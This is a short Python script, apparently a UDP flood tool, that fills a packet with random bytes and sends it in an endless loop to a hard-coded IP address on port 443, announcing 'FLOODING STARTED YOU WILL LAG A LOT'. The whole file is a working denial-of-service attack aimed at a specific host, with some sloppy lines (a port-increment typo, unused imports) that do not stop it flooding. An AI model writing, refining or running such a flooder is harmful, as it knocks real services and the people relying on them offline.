import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print 

ip = str("204.96.191.59")
port = int("443")

sent = 0
print("~ FLOODING STARTED YOU WILL LAG A LOT ~")
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port - port + 1
    if port == 65534:
        port = port - 1